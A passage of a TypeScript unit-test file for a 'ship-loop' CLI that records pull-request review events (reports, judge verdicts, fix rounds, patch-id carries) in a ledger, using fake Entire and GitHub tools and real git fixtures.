import { expect, test } from "bun:test";
import { existsSync, mkdtempSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { apply, keyOf, prompt, renderEvent, replay, statusOf, type Comment, type Event, type State } from "./ship-loop.ts";

const CLI = join(import.meta.dir, "ship-loop.ts");
const FAKE_ENTIRE = join(import.meta.dir, "fake-entire.ts");
const FAKE_GH = join(import.meta.dir, "fake-gh.ts");
// Change example/3 on project trail 7, in the form `entire trail show` lists it.
const CHANGE = "https://entire.com/gh/misty-step/-/trails/7/changes/example/3";
const TICKET = "https://entire.com/gh/misty-step/-/trails/3";
const H1 = "1".repeat(40);
const H2 = "2".repeat(40);
const BASE = "origin/master";
const MARKER = "<!-- ship-loop:event v1 -->";
const FROZEN_V1 = "924af6c000d84866af2541a015608f9938b0f963";

function scratch(): string {
  const root = join(homedir(), ".cache", "tmp");
  mkdirSync(root, { recursive: true });
  return mkdtempSync(join(root, "ship-loop-test-"));
}

// The fakes' shared state: the change as Entire reports it, its findings, and its GitHub pull requests.
type Pull = {
  number: number; url: string; state: string; headRefName: string; isCrossRepository: boolean; author: string;
  comments: { login: string; body: string }[];
};
type Store = {
  findings: { id: string; body: string; actorId: string | null; status: string; version: number; clientId?: string }[];
  next: number;
  version: number;
  base_ref: string;
  change: { project: string; selector: string; trail: number; author: string | null; branch: string; merged?: boolean };
  trail_author?: string;
  pulls: Pull[];
};
type Harness = { dir: string; store: string; log: string; repo?: string };

// Finding ids are ULIDs; zero-padded numbers keep the same order.
const fid = (n: number) => String(n).padStart(26, "0");

function harness(comments: Comment[] = [], repo?: string, baseRef = "master"): Harness {
  const dir = scratch();
  const store = join(dir, "store.json");
  const state: Store = {
    findings: comments.map((c) => ({ id: c.id, body: c.body, actorId: c.author, status: c.status, version: 0 })),
    next: comments.length + 100, version: 0, base_ref: baseRef,
    change: { project: "gh/misty-step", selector: "example/3", trail: 7, author: "conductor", branch: "feature" },
    pulls: [],
  };
  writeFileSync(store, JSON.stringify(state));
  return { dir, store, log: join(dir, "calls.jsonl"), repo };
}

// Changes the fakes' state as another writer, a push or GitHub would.
function edit(h: Harness, change: (s: Store) => void) {
  const s = JSON.parse(readFileSync(h.store, "utf8")) as Store;
  change(s);
  writeFileSync(h.store, JSON.stringify(s));
}

function comments(h: Harness): Comment[] {
  const store = JSON.parse(readFileSync(h.store, "utf8")) as Store;
  return store.findings.map((f) => ({ id: f.id, body: f.body, author: f.actorId, status: f.status }));
}

// Every `entire` invocation, in order.
function calls(h: Harness): string[][] {
  return existsSync(h.log) ? readFileSync(h.log, "utf8").split("\n").filter((line) => line !== "").map((line) => JSON.parse(line)) : [];
}

async function cli(h: Harness, args: string[], payload?: unknown, env: Record<string, string> = {}) {
  let file: string | undefined;
  if (payload !== undefined) {
    file = join(h.dir, `payload-${Math.random().toString(36).slice(2)}.json`);
    writeFileSync(file, typeof payload === "string" ? payload : JSON.stringify(payload));
  }
  const proc = Bun.spawn(["bun", CLI, ...args, ...(file ? ["--file", file] : [])], {
    cwd: h.repo,
    env: { ...process.env, SHIP_LOOP_ENTIRE: FAKE_ENTIRE, SHIP_LOOP_GH: FAKE_GH, SHIP_LOOP_FAKE_STORE: h.store, SHIP_LOOP_FAKE_CALLS: h.log, ...env },
    stdout: "pipe",
    stderr: "pipe",
  });
  const [out, err, code] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text(), proc.exited]);
  return { code, out, err };
}

const finding = (id: string, over: Record<string, unknown> = {}) => ({
  id, evidence: `evidence for ${id}`, introduced_by_diff: true, already_on_main: false, blocker_class: "broken_journey", ...over,
});

const initArgs = (change: string) => ["init", "--change", change, "--ticket", TICKET, "--rigor", "standard", "--rigor-reason", "runtime change", "--base", BASE, "--sha", H1, "--builder-thread", "builder-1"];

async function initPr(h: Harness) {
  return cli(h, initArgs(CHANGE));
}

async function reportQa(h: Harness, findings: unknown[] = [], outcome = "ISSUES", env: Record<string, string> = {}) {
  return cli(h, ["record", "--change", CHANGE, "--kind", "report"], {
    role: "qa", sha: H1, thread_id: "qa-1", report_url: "https://github.com/misty-step/example/pull/7#issuecomment-1", outcome, findings,
  }, env);
}

async function reportReview(h: Harness, findings: unknown[] = [], env: Record<string, string> = {}) {
  return cli(h, ["record", "--change", CHANGE, "--kind", "report"], {
    role: "review", sha: H1, thread_id: "review-1", report_url: "https://github.com/misty-step/example/pull/7#issuecomment-2", outcome: "ISSUES", findings,
  }, env);
}

function status(h: Harness) {
  return cli(h, ["status", "--change", CHANGE, "--json"]).then((r) => ({ ...r, doc: JSON.parse(r.out) }));
}

test("init writes one ledger and status exposes phase, fix round, review threads and head", async () => {
  const h = harness();
  expect((await initPr(h)).code).toBe(0);
  const s = await status(h);
  expect(s.code).toBe(0);
  expect(s.doc.schema).toBe("ship-loop.status.v2");
  expect(s.doc.phase).toBe("verify");
  expect(s.doc.fix_round).toBe(0);
  expect(s.doc.review_thread_count).toBe(0);
  expect(s.doc.review_thread_ids).toEqual([]);
  expect(s.doc.source_head).toBe(H1);
});

test("init on an existing ledger resumes and never resets the round", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1")]);
  await reportReview(h);
  const judged = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], {
    thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: ["qa:F1"], report_url: "https://github.com/misty-step/example/pull/7#issuecomment-3",
  });
  expect(judged.code).toBe(0);
  const before = comments(h).length;
  const resumed = await cli(h, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "standard", "--rigor-reason", "new thread", "--base", BASE, "--sha", H2, "--builder-thread", "builder-9"]);
  expect(resumed.code).toBe(0);
  expect(resumed.out).toContain("no reset");
  expect(comments(h).length).toBe(before);
  const s = await status(h);
  expect(s.doc.fix_round).toBe(1);
  expect(s.doc.phase).toBe("fix");
  expect(s.doc.source_head).toBe(H1);
  const other = await cli(h, ["init", "--change", CHANGE, "--ticket", "https://github.com/misty-step/example/issues/4", "--rigor", "light", "--rigor-reason", "x", "--base", BASE, "--sha", H1, "--builder-thread", "b"]);
  expect(other.code).toBe(1);
});

test("an unreadable or malformed ledger is unknown, never a fresh round", async () => {
  const h = harness();
  await initPr(h);
  const read = await cli(h, ["status", "--change", CHANGE, "--json"], undefined, { SHIP_LOOP_FAKE_FAIL: "read" });
  expect(read.code).toBe(2);
  expect(read.out).toBe("");
  const init = await cli(h, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "x", "--base", BASE, "--sha", H1, "--builder-thread", "b"], undefined, { SHIP_LOOP_FAKE_FAIL: "read" });
  expect(init.code).toBe(2);
  expect(comments(h).length).toBe(1);

  const broken = harness([{ id: fid(5), author: "conductor", status: "resolved", body: "<!-- ship-loop:event v1 -->\n```json\n{not json\n```\n" }]);
  expect((await cli(broken, ["status", "--change", CHANGE, "--json"])).code).toBe(2);
  const write = await cli(broken, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "x", "--base", BASE, "--sha", H1, "--builder-thread", "b"]);
  expect(write.code).toBe(2);
  expect(comments(broken).length).toBe(1);
});

test("a reviewer cannot authorize a fix, and a fix builder prompt needs a recorded FIX", async () => {
  const h = harness();
  await initPr(h);
  const smuggled = await reportReview(h, [finding("F1")].map((f) => ({ ...f })));
  expect(smuggled.code).toBe(0);
  const forged = await cli(h, ["record", "--change", CHANGE, "--kind", "report"], {
    role: "qa", sha: H1, thread_id: "qa-1", report_url: "https://github.com/misty-step/example/pull/7#issuecomment-9", outcome: "ISSUES", findings: [], verdict: "FIX",
  });
  expect(forged.code).toBe(1);
  expect(forged.err).toContain('unknown field "verdict"');
  const fixPrompt = await cli(h, ["prompt", "--change", CHANGE, "--role", "fix-builder"]);
  expect(fixPrompt.code).toBe(1);
  expect((await status(h)).doc.fix_round).toBe(0);
});

test("a judge must be independent of the builder and the reviewers", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1")]);
  await reportReview(h);
  for (const thread of ["builder-1", "qa-1", "review-1"]) {
    const r = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: thread, sha: H1, verdict: "SHIP", blockers: [], report_url: "https://example.test/v" });
    expect(r.code).toBe(1);
  }
  expect((await status(h)).doc.phase).toBe("judge");
});

test("old-main, not-introduced and class-none findings cannot be blockers", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [
    finding("F1", { introduced_by_diff: false }),
    finding("F2", { already_on_main: true }),
    finding("F3", { blocker_class: "none" }),
  ]);
  await reportReview(h);
  for (const ref of ["qa:F1", "qa:F2", "qa:F3", "qa:F404"]) {
    const r = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: [ref], report_url: "https://example.test/v" });
    expect(r.code).toBe(1);
  }
  expect((await status(h)).doc.fix_round).toBe(0);
});

test("exactly one FIX; recheck narrows to the named blocker; the final prompt offers no FIX", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1"), finding("F2", { blocker_class: "wrong_data" })]);
  await reportReview(h);
  const fix = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: ["qa:F1"], report_url: "https://example.test/v1" });
  expect(fix.code).toBe(0);
  expect((await status(h)).doc.fix_blockers).toEqual(["qa:F1"]);

  const builderPrompt = await cli(h, ["prompt", "--change", CHANGE, "--role", "fix-builder"]);
  expect(builderPrompt.out).toContain("`qa:F1`");
  expect(builderPrompt.out).not.toContain("qa:F2");

  const again = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-2", sha: H1, verdict: "FIX", blockers: ["qa:F2"], report_url: "https://example.test/v2" });
  expect(again.code).toBe(1);

  const fixed = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "fix", sha: H2, thread_id: "builder-2" });
  expect(fixed.code).toBe(0);
  expect((await status(h)).doc.phase).toBe("recheck");

  const wrongThread = await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { thread_id: "qa-recheck-1", reporter_thread_id: "review-1", sha: H2, report_url: "https://example.test/r", regressions: [], results: [{ blocker: "qa:F1", status: "fixed", evidence: "https://example.test/fixed" }] });
  expect(wrongThread.code).toBe(1);
  const extra = await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { thread_id: "qa-recheck-1", reporter_thread_id: "qa-1", sha: H2, report_url: "https://example.test/r", regressions: [], results: [{ blocker: "qa:F1", status: "fixed", evidence: "https://example.test/fixed" }, { blocker: "qa:F2", status: "fixed", evidence: "https://example.test/fixed" }] });
  expect(extra.code).toBe(1);

  const recheck = await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { thread_id: "qa-recheck-1", reporter_thread_id: "qa-1", sha: H2, report_url: "https://example.test/r", regressions: [], results: [{ blocker: "qa:F1", status: "fixed", evidence: "https://example.test/fixed" }] });
  expect(recheck.code).toBe(0);
  const finalPrompt = await cli(h, ["prompt", "--change", CHANGE, "--role", "final-judge"]);
  expect(finalPrompt.code).toBe(0);
  expect(finalPrompt.out).not.toMatch(/\bFIX\b/);

  const secondFix = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-2", sha: H2, verdict: "FIX", blockers: ["qa:F2"], report_url: "https://example.test/v3" });
  expect(secondFix.code).toBe(1);
  expect(secondFix.err).toContain("no fix round remains");

  const ship = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-2", sha: H2, verdict: "SHIP", blockers: [], tickets: ["https://github.com/misty-step/example/issues/9"], report_url: "https://example.test/v4" });
  expect(ship.code).toBe(0);
  const done = await status(h);
  expect(done.doc.phase).toBe("shipped");
  expect(done.doc.fix_round).toBe(1);
  expect(done.doc.review_thread_ids).toEqual(["qa-1", "qa-recheck-1", "review-1"]);
  expect(done.doc.review_thread_count).toBe(3);
  expect(done.doc.source_head).toBe(H2);
});

test("a new thread reads the final state, and a repeated identical write is idempotent", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1")]);
  await reportReview(h);
  const before = comments(h).length;
  const repeat = await reportQa(h, [finding("F1")]);
  expect(repeat.code).toBe(0);
  expect(repeat.out).toContain("already recorded");
  expect(comments(h).length).toBe(before);
  const fresh = await cli(h, ["status", "--change", CHANGE, "--json"]);
  expect(JSON.parse(fresh.out).phase).toBe("judge");
});

test("a write whose response is lost is confirmed on read-back, resolved, and not repeated", async () => {
  const h = harness();
  await initPr(h);
  const before = comments(h).length;
  const lost = await cli(h, ["record", "--change", CHANGE, "--kind", "report"], {
    role: "qa", sha: H1, thread_id: "qa-1", report_url: "https://example.test/r", outcome: "PASS", findings: [],
  }, { SHIP_LOOP_FAKE_FAIL: "post-after" });
  expect(lost.code).toBe(0);
  expect(comments(h).length).toBe(before + 1);
  expect(comments(h).at(-1)?.status).toBe("resolved");
});

test("finding authors keep outsiders from forging or locking the ledger", async () => {
  const h = harness();
  await initPr(h);
  const store = JSON.parse(readFileSync(h.store, "utf8"));
  store.findings.push(
    { id: fid(201), actorId: "outsider", status: "open", body: renderWithKey({ v: 1, kind: "report", seq: 2, role: "qa", sha: H1, thread_id: "fake-qa", report_url: "forged", outcome: "PASS", findings: [] }) },
    { id: fid(202), actorId: "outsider", status: "open", body: "<!-- ship-loop:event v1 -->\ninvalid" },
    { id: fid(203), actorId: null, status: "open", body: "<!-- ship-loop:event v1 -->\ninvalid" },
  );
  writeFileSync(h.store, JSON.stringify(store));
  expect((await status(h)).doc.phase).toBe("verify");
  expect((await reportQa(h, [finding("F1")])).code).toBe(0);
  expect((await reportReview(h)).code).toBe(0);
  const result = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: ["qa:F1"], report_url: "https://example.test/v" });
  expect(result.code).toBe(0);
  expect((await status(h)).doc.fix_blockers).toEqual(["qa:F1"]);
});

test("the judge can ship ISSUES with tickets, while BLOCKED still refuses SHIP", async () => {
  for (const outcome of ["PASS", "ISSUES", "BLOCKED"]) {
    const h = harness();
    await initPr(h);
    await reportQa(h, [finding("N1", { blocker_class: "none" })], outcome);
    await reportReview(h);
    const result = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "SHIP", blockers: [], tickets: ["https://example.test/follow-up"], report_url: "https://example.test/v" });
    expect(result.code).toBe(outcome === "BLOCKED" ? 1 : 0);
    expect((await status(h)).doc.phase).toBe(outcome === "BLOCKED" ? "judge" : "shipped");
  }
});

test("a fresh independent recheck links its reporter and exposes fix regressions to the final judge", async () => {
  const h = harness();
  await initPr(h);
  await reportQa(h, [finding("F1")]);
  await reportReview(h);
  await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: H1, verdict: "FIX", blockers: ["qa:F1"], report_url: "https://example.test/v" });
  await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "fix", sha: H2, thread_id: "builder-2" });
  const payload = { thread_id: "qa-recheck-1", reporter_thread_id: "qa-1", sha: H2, report_url: "https://example.test/recheck", results: [{ blocker: "qa:F1", status: "fixed", evidence: "https://example.test/fixed" }], regressions: [finding("R1", { evidence: "fix broke the build", blocker_class: "broken_build" })] };
  for (const thread_id of ["qa-1", "review-1", "judge-1", "builder-1", "builder-2"]) {
    expect((await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { ...payload, thread_id })).code).toBe(1);
  }
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { ...payload, regressions: [finding("R1", { already_on_main: true })] })).code).toBe(1);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], payload)).code).toBe(0);
  const final = await cli(h, ["prompt", "--change", CHANGE, "--role", "final-judge"]);
  expect(final.code).toBe(0);
  expect(final.out).toContain("fix broke the build");
  expect(final.out).toContain("https://example.test/recheck");
  expect(final.out).toContain("REVERT or SPLIT");
  expect(final.out).not.toMatch(/\bFIX\b/);
  const result = await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-2", sha: H2, verdict: "SPLIT", blockers: [], report_url: "https://example.test/final" });
  expect(result.code).toBe(0);
  expect((await status(h)).doc.recheck.regressions[0].id).toBe("R1");
  expect((await status(h)).doc.phase).toBe("revert-split");
});

test("a light rigor PR takes one combined review and a standard PR refuses it", async () => {
  const light = harness();
  await cli(light, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "docs", "--base", BASE, "--sha", H1, "--builder-thread", "b"]);
  expect((await cli(light, ["prompt", "--change", CHANGE, "--role", "qa-review"])).code).toBe(0);
  expect((await cli(light, ["prompt", "--change", CHANGE, "--role", "qa"])).code).toBe(1);
});

test("replay keeps the earliest finding for a sequence number and rejects a gap", () => {
  const init = (seq: number) => ({ v: 1, kind: "init", seq, key: "", ticket: TICKET, change_url: CHANGE, rigor: "light", rigor_reason: "docs", base: BASE, sha: H1, builder_thread_id: "b" });
  const first = JSON.parse(JSON.stringify(init(1)));
  const ledger = replay([{ id: fid(1), author: "conductor", status: "resolved", body: renderWithKey(first) }], "conductor");
  expect(ledger.state?.phase).toBe("verify");
  const lostSeq2 = renderWithKey({ v: 1, kind: "report", seq: 2, role: "qa-review", sha: H1, thread_id: "x", report_url: "u", outcome: "PASS", findings: [] });
  const wonSeq2 = renderWithKey({ v: 1, kind: "report", seq: 2, role: "qa-review", sha: H1, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] });
  const dup = replay([{ id: fid(1), author: "conductor", status: "resolved", body: renderWithKey(first) }, { id: fid(5), author: "conductor", status: "resolved", body: wonSeq2 }, { id: fid(6), author: "conductor", status: "resolved", body: lostSeq2 }], "conductor");
  expect(dup.last_seq).toBe(2);
  expect(dup.rejected).toEqual([fid(6)]);
  expect(dup.state?.phase).toBe("judge");
  expect(() => replay([{ id: fid(1), author: "conductor", status: "resolved", body: renderWithKey(first) }, { id: fid(9), author: "conductor", status: "resolved", body: renderWithKey({ v: 1, kind: "report", seq: 3, role: "qa-review", sha: H1, thread_id: "q", report_url: "u", outcome: "PASS", findings: [] }) }], "conductor")).toThrow(/gap/);
});

test("a carry needs an unchanged patch-id, and only moves head before the ruling", () => {
  const judged: State = {
    ticket: TICKET, change_url: CHANGE, rigor: "light", rigor_reason: "docs", base: BASE, head: H1, carried: [], phase: "judge",
    builder_threads: ["b"], judge_threads: [], reports: {}, recheck: null, fix_round: 0, fix: null, verdict: null,
  };
  const carry = (patchFrom: string, patchTo: string, bases: Record<string, string> = {}): Event => ({ v: 1, kind: "head", seq: 3, key: "", reason: "carry", from: H1, sha: H2, patch_id_from: patchFrom, patch_id_to: patchTo, ...bases });
  expect(() => apply(judged, carry("p1", "p2"))).toThrow(/unchanged patch-id/);
  const moved = apply(judged, carry("p1", "p1"));
  expect(moved.head).toBe(H2);
  expect(moved.carried).toEqual([H1]);
  expect(moved.phase).toBe("judge");
  expect(moved.base).toBe(BASE);
  expect(() => apply({ ...judged, phase: "verify" }, carry("p1", "p1"))).toThrow(/before a ruling/);

  const [oldBase, newBase] = ["a".repeat(40), "b".repeat(40)];
  expect(apply(judged, carry("p1", "p1", { from_base: oldBase, to_base: newBase })).base).toBe(newBase);
  expect(() => apply(judged, carry("p1", "p1", { from_base: oldBase }))).toThrow(/bases must both be full commit SHAs/);
  expect(() => apply(judged, carry("p1", "p1", { from_base: oldBase, to_base: "origin/master" }))).toThrow(/full commit SHAs/);
  expect(() => apply(judged, carry("p1", "p1", { base: newBase }))).toThrow(/unknown field "base"/);
});

test("v1 carry events without bases replay with their original meaning", () => {
  const events = [
    { v: 1, kind: "init", seq: 1, ticket: TICKET, change_url: CHANGE, rigor: "light", rigor_reason: "docs", base: BASE, sha: H1, builder_thread_id: "b" },
    { v: 1, kind: "report", seq: 2, role: "qa-review", sha: H1, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] },
    { v: 1, kind: "verdict", seq: 3, thread_id: "judge-1", sha: H1, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" },
    { v: 1, kind: "head", seq: 4, reason: "carry", from: H1, sha: H2, patch_id_from: "p1", patch_id_to: "p1" },
  ];
  const ledger = replay(events.map((e, i) => ({ id: fid(i + 1), author: "conductor", status: "resolved", body: renderWithKey(e) })), "conductor");
  expect(ledger.last_seq).toBe(4);
  expect(ledger.state).toMatchObject({ phase: "shipped", head: H2, carried: [H1], base: BASE, fix_round: 0 });
});

test("a pre-review refresh moves head and base, and cannot reset a reported, ruled or fixed PR", () => {
  const fresh: State = {
    ticket: TICKET, change_url: CHANGE, rigor: "standard", rigor_reason: "runtime", base: BASE, head: H1, carried: [], phase: "verify",
    builder_threads: ["b"], judge_threads: [], reports: {}, recheck: null, fix_round: 0, fix: null, verdict: null,
  };
  const newBase = "3".repeat(40);
  const refresh: Event = { v: 1, kind: "head", seq: 2, key: "", reason: "refresh", from: H1, sha: H2, base: newBase };
  expect(apply(fresh, refresh)).toEqual({ ...fresh, head: H2, base: newBase });
  expect(() => apply(fresh, { ...refresh, from: H2, sha: "4".repeat(40) })).toThrow(/refresh is from/);
  expect(() => apply(fresh, { ...refresh, base: "origin/master" })).toThrow(/full commit SHA/);
  expect(() => apply(fresh, { ...refresh, patch_id_to: "p", from_base: newBase })).toThrow(/unknown field "from_base"/);

  const report = { role: "qa", sha: H1, thread_id: "qa-1", report_url: "u", outcome: "ISSUES", findings: [finding("F1")] };
  const reported: State = { ...fresh, reports: { qa: report } };
  expect(() => apply(reported, refresh)).toThrow(/only before any report; this change is in verify with 1 report/);
  const fixed: State = { ...reported, phase: "fix", fix_round: 1, fix: { blockers: ["qa:F1"], reporter_thread: "qa-1", judge_thread: "judge-1", sha: H1 }, verdict: { verdict: "FIX", sha: H1, thread_id: "judge-1" } };
  for (const phase of ["judge", "fix", "recheck", "final-judge", "shipped", "revert-split"] as const) {
    expect(() => apply({ ...fixed, phase }, refresh)).toThrow(/only before any report/);
  }
});

// ---- real Git fixtures: the CLI computes actual stable patch-ids ----

function git(repo: string, ...args: string[]): string {
  const r = Bun.spawnSync(["git", "-c", "user.name=t", "-c", "user.email=t@example.test", "-c", "commit.gpgsign=false", ...args], { cwd: repo, stdout: "pipe", stderr: "pipe" });
  if (r.exitCode !== 0) throw new Error(`git ${args.join(" ")}: ${r.stderr.toString()}`);
  return r.stdout.toString().trim();
}

function commitFile(repo: string, file: string, content: string): string {
  writeFileSync(join(repo, file), content);
  git(repo, "add", file);
  git(repo, "commit", "-qm", `edit ${file}`);
  return git(repo, "rev-parse", "HEAD");
}

function gitRepo(): string {
  const repo = join(scratch(), "repo");
  mkdirSync(repo);
  git(repo, "init", "-q", "-b", "master");
  commitFile(repo, "main.txt", "main\n");
  git(repo, "update-ref", "refs/remotes/origin/master", "HEAD");
  return repo;
}

function stablePatchId(repo: string, base: string, sha: string): string {
  const diff = Bun.spawnSync(["git", "diff", `${base}...${sha}`], { cwd: repo }).stdout;
  return Bun.spawnSync(["git", "patch-id", "--stable"], { cwd: repo, stdin: diff }).stdout.toString().split(" ")[0];
}

function lastEvent(h: Harness): Record<string, unknown> {
  const body = comments(h).at(-1)!.body;
  return JSON.parse(/```json\n([\s\S]*)\n```/.exec(body)![1]);
}

test("a carry compares each revision with its own base across a squash-merged stack parent and new main", async () => {
  // Harness PR496 shape: a child reviewed and fixed on its stack parent; the parent squash-merges, main moves on, the child rebases onto main.
  const repo = gitRepo();
  git(repo, "switch", "-qc", "parent");
  commitFile(repo, "parent.txt", "one\n");
  const parent = commitFile(repo, "parent.txt", "one\ntwo\n");
  git(repo, "switch", "-qc", "child");
  const reviewed = commitFile(repo, "child.txt", "child\n");
  const fixed = commitFile(repo, "child.txt", "child\nfixed\n");
  git(repo, "switch", "-q", "master");
  git(repo, "merge", "-q", "--squash", "parent");
  git(repo, "commit", "-qm", "parent (squash)");
  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
  git(repo, "update-ref", "refs/remotes/origin/master", main);
  git(repo, "update-ref", "refs/remotes/origin/parent", parent);
  git(repo, "switch", "-q", "--detach", fixed);
  git(repo, "rebase", "-q", "--onto", "master", "parent");
  const rebased = git(repo, "rev-parse", "HEAD");
  git(repo, "switch", "-q", "--detach", rebased);
  const drifted = commitFile(repo, "child.txt", "child\nfixed\nunreviewed\n");
  // The ledger's single base cannot carry this: the new diff includes the squashed parent and the unrelated main change.
  expect(stablePatchId(repo, "parent", fixed)).not.toBe(stablePatchId(repo, "parent", rebased));

  const h = harness([], repo, "parent");
  const url = (n: number) => `https://example.test/${n}`;
  expect((await cli(h, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "standard", "--rigor-reason", "runtime", "--base", parent, "--sha", reviewed, "--builder-thread", "builder-1"])).code).toBe(0);
  for (const [role, findings] of [["qa", [finding("F1")]], ["review", []]] as const) {
    expect((await cli(h, ["record", "--change", CHANGE, "--kind", "report"], { role, sha: reviewed, thread_id: `${role}-1`, report_url: url(1), outcome: "ISSUES", findings })).code).toBe(0);
  }
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: reviewed, verdict: "FIX", blockers: ["qa:F1"], report_url: url(2) })).code).toBe(0);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "fix", sha: fixed, thread_id: "builder-2" })).code).toBe(0);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "recheck"], { thread_id: "qa-recheck-1", reporter_thread_id: "qa-1", sha: fixed, report_url: url(3), regressions: [], results: [{ blocker: "qa:F1", status: "fixed", evidence: url(4) }] })).code).toBe(0);
  const before = await status(h);
  const posted = comments(h).length;
  const notRetargeted = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, from_base: parent, sha: rebased, to_base: main });
  expect(notRetargeted.code).toBe(1);
  expect(comments(h).length).toBe(posted);
  const store = JSON.parse(readFileSync(h.store, "utf8"));
  store.base_ref = "master";
  writeFileSync(h.store, JSON.stringify(store));

  const unequal = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: drifted, to_base: "master" });
  expect(unequal.code).toBe(1);
  expect(unequal.err).toContain("unchanged patch-id");
  const unknownBase = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, from_base: "no-such-branch", sha: rebased, to_base: "master" });
  expect(unknownBase.code).toBe(1);
  expect(unknownBase.err).toContain("no-such-branch is not a commit in this checkout");
  const noBase = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, sha: rebased, to_base: "master" });
  expect(noBase.code).toBe(1);
  expect(noBase.err).toContain("from_base is required");
  expect(comments(h).length).toBe(posted);

  const carried = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: rebased, to_base: "master" });
  expect(carried.code).toBe(0);
  const event = lastEvent(h);
  expect(event).toMatchObject({ reason: "carry", from: fixed, sha: rebased, from_base: parent, to_base: main });
  expect(event.patch_id_from).toBe(stablePatchId(repo, parent, fixed));
  expect(event.patch_id_to).toBe(event.patch_id_from);

  const after = await status(h);
  expect(after.doc).toMatchObject({ phase: "final-judge", source_head: rebased, carried_shas: [fixed], base: main, fix_round: 1, fix_blockers: ["qa:F1"] });
  expect(after.doc.recheck).toEqual(before.doc.recheck);
  expect(after.doc.review_thread_ids).toEqual(before.doc.review_thread_ids);
  expect((await cli(h, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-2", sha: rebased, verdict: "SHIP", blockers: [], tickets: [], report_url: url(5) })).code).toBe(0);
  expect((await status(h)).doc.phase).toBe("shipped");
  const recorded = readFileSync(h.store, "utf8");
  const retry = await cli(h, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: fixed, from_base: "parent", sha: rebased, to_base: "master" });
  expect(retry.code).toBe(0);
  expect(readFileSync(h.store, "utf8")).toBe(recorded);
}, 15_000);

test("a pinned-base PR carries its SHIP across a merge of newer main, and refresh moves an unreviewed head", async () => {
  // Harness PR461 shape: the PR was judged against a pinned base, then newer main was merged into it.
  const repo = gitRepo();
  const pinned = git(repo, "rev-parse", "HEAD");
  git(repo, "switch", "-qc", "pr");
  const judged = commitFile(repo, "feature.txt", "feature\n");
  git(repo, "switch", "-q", "master");
  const main = commitFile(repo, "unrelated.txt", "main moved on\n");
  git(repo, "update-ref", "refs/remotes/origin/master", main);
  git(repo, "switch", "-q", "pr");
  git(repo, "merge", "-q", "--no-edit", "master");
  const merged = git(repo, "rev-parse", "HEAD");
  expect(stablePatchId(repo, pinned, judged)).not.toBe(stablePatchId(repo, pinned, merged));

  const shipped = harness([], repo);
  expect((await cli(shipped, ["init", "--change", CHANGE, "--ticket", TICKET, "--rigor", "light", "--rigor-reason", "docs", "--base", pinned, "--sha", judged, "--builder-thread", "builder-1"])).code).toBe(0);
  expect((await cli(shipped, ["record", "--change", CHANGE, "--kind", "report"], { role: "qa-review", sha: judged, thread_id: "qa-1", report_url: "u", outcome: "PASS", findings: [] })).code).toBe(0);
  expect((await cli(shipped, ["record", "--change", CHANGE, "--kind", "verdict"], { thread_id: "judge-1", sha: judged, verdict: "SHIP", blockers: [], tickets: [], report_url: "v" })).code).toBe(0);
  expect((await cli(shipped, ["record", "--change", CHANGE, "--kind", "head"], { reason: "carry", from: judged, from_base: pinned, sha: merged, to_base: "master" })).code).toBe(0);
  expect((await status(shipped)).doc).toMatchObject({ phase: "shipped", source_head: merged, base: main, carried_shas: [judged] });

  // Before any report, the same new head is a refresh: init and the fix budget stay, head and base move.
